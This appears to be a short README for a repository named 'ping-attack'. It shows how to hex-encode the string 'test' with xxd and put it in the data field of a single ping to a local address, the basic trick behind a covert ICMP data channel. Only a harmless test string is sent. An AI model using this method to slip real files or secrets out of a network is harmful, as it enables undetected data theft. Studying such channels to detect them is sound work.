# ping-attack

Basic Commands:

```shell
#!/bin/bash
#This will take the text "test" and convert to hex
echo "test" | xxd -p
#746573740a
#This will ping the ip address and add the hex of "test" into the data field
ping -c 1 192.168.1.5 -p 746573740a
